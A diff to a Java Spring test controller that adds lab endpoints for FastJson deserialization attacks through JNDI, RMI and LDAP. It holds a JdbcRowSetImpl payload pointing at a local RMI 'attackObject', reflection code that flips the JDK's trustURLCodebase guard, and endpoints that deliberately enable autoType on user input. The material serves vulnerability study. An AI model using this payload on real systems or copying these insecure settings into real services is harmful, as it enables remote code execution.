@@ -5,6 +5,7 @@ import com.alibaba.fastjson.parser.Feature;
 import com.alibaba.fastjson.parser.ParserConfig;
 import com.alibaba.fastjson.serializer.SerializerFeature;
 import com.alibaba.fastjson.util.TypeUtils;
+import com.sun.jndi.rmi.registry.RegistryContext;
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -15,6 +16,7 @@ import org.springframework.web.bind.annotation.*;
 import sun.misc.BASE64Encoder;
 
 import java.io.*;
+import java.lang.reflect.*;
 
 @Api(tags = "FastJson 测试")
 @RestController
@@ -66,6 +68,39 @@ public class FastJsonTestController {
                     "\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"cn.moonlord.test.FastJsonTestController$SimpleObject\"}," +
                     "\"b\":{\"@type\":\"cn.moonlord.test.FastJsonTestController$SimpleObject\",\"name\":\"Hello World\"}" +
             "}";
+    private static final String testCaseB1 =
+            "{" +
+                    "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
+                    "\"dataSourceName\":\"rmi://127.0.0.1:9000/naming/attackObject\"," +
+                    "\"autoCommit\":true" +
+            "}";
+
+    public static void resetRmiTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
+        Field[] fields = RegistryContext.class.getDeclaredFields();
+        for (Field field: fields) {
+            if(field.getName().equals("trustURLCodebase")){
+                field.setAccessible(true);
+                Field modifiers = Field.class.getDeclaredField("modifiers");
+                modifiers.setAccessible(true);
+                modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                field.setBoolean(null, trustURLCodebase);
+            }
+        }
+    }
+
+    public static void resetLdapTrustURLCodebase(Boolean trustURLCodebase) throws Exception {
+        Class VersionHelper12 = Class.forName("com.sun.naming.internal.VersionHelper12");
+        Field[] fields = VersionHelper12.getDeclaredFields();
+        for (Field field: fields) {
+            if(field.getName().equals("trustURLCodebase")){
+                field.setAccessible(true);
+                Field modifiers = Field.class.getDeclaredField("modifiers");
+                modifiers.setAccessible(true);
+                modifiers.setInt(field, field.getModifiers() & ~Modifier.FINAL);
+                field.set(null, trustURLCodebase.toString());
+            }
+        }
+    }
 
     @ApiOperation(value="测试用例 A1，使用 SerializerFeature.WriteClassName 特性，将对象转换为包含 @type 的 Json 字符串")
     @ApiImplicitParams({@ApiImplicitParam(name = "name", value = "name", example = testCaseA1)})
@@ -115,7 +150,7 @@ public class FastJsonTestController {
         return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
     }
 
-    @ApiOperation(value="测试用例 A5，使用 Feature.SupportNonPublicField 特性时，旧版本可构造 TemplatesImpl 进行反序列化攻击，新版本已经被黑名单限制")
+    @ApiOperation(value="测试用例 A5，旧版本使用 Feature.SupportNonPublicField 特性时，可构造 TemplatesImpl 进行反序列化攻击，新版本已经被黑名单限制")
     @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA3)})
     @GetMapping(value = "/TestA5")
     public String TestA5(@RequestParam String JsonString) {
@@ -138,13 +173,63 @@ public class FastJsonTestController {
         return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
     }
 
-    @ApiOperation(value="测试用例 A6，旧版本可使用 java.lang.Class 加载类，利用缓存绕过类型的黑名单限制，新版本已修改为不缓存")
+    @ApiOperation(value="测试用例 A6，旧版本可使用 java.lang.Class 加载类，利用缓存绕过类型的黑名单限制，新版本已经修改为不缓存")
     @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseA4)})
     @GetMapping(value = "/TestA6")
     public String TestA6(@RequestParam String JsonString) {
         ParserConfig.global = new ParserConfig();
         ParserConfig.global.setAutoTypeSupport(true);
         TypeUtils.clearClassMapping();
+        Object simpleObject = JSON.parseObject(JsonString);
+        System.out.println("simpleObject : " + simpleObject.getClass().getName());
+        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
+    }
+
+    @ApiOperation(value="测试用例 B1，使用 JNDI+RMI/LDAP 加载远程对象，进行反序列化攻击，新版本 JDK 中，Reference 不会被构造为对象")
+    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseB1)})
+    @GetMapping(value = "/TestB1")
+    public String TestB1(@RequestParam String JsonString) throws Exception {
+        ParserConfig.global = new ParserConfig();
+        ParserConfig.global.setAutoTypeSupport(true);
+        ParserConfig.global.addAccept("com.");
+        TypeUtils.clearClassMapping();
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");
+        resetLdapTrustURLCodebase(false);
+        resetLdapTrustURLCodebase(false);
+        Object simpleObject = JSON.parseObject(JsonString);
+        System.out.println("simpleObject : " + simpleObject.getClass().getName());
+        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
+    }
+
+    @ApiOperation(value="测试用例 B2，在 B1 的基础上，设置 trustURLCodebase 为 true，模拟旧版本 JDK，仍会受到 FastJson 的黑名单限制")
+    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseB1)})
+    @GetMapping(value = "/TestB2")
+    public String TestB2(@RequestParam String JsonString) throws Exception {
+        ParserConfig.global = new ParserConfig();
+        ParserConfig.global.setAutoTypeSupport(true);
+        TypeUtils.clearClassMapping();
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+        resetLdapTrustURLCodebase(true);
+        resetLdapTrustURLCodebase(true);
+        Object simpleObject = JSON.parseObject(JsonString);
+        System.out.println("simpleObject : " + simpleObject.getClass().getName());
+        return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
+    }
+
+    @ApiOperation(value="测试用例 B3，在 B2 的基础上，添加 addAccept，模拟旧版本 FastJson，对象成功构造（可以执行攻击代码）")
+    @ApiImplicitParams({@ApiImplicitParam(name = "JsonString", value = "Json 字符串", example = testCaseB1)})
+    @GetMapping(value = "/TestB3")
+    public String TestB3(@RequestParam String JsonString) throws Exception {
+        ParserConfig.global = new ParserConfig();
+        ParserConfig.global.setAutoTypeSupport(true);
+        ParserConfig.global.addAccept("com.");
+        TypeUtils.clearClassMapping();
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
+        resetLdapTrustURLCodebase(true);
+        resetLdapTrustURLCodebase(true);
         Object simpleObject = JSON.parseObject(JsonString);
         System.out.println("simpleObject : " + simpleObject.getClass().getName());
         return JSON.toJSONString(simpleObject, SerializerFeature.PrettyFormat);
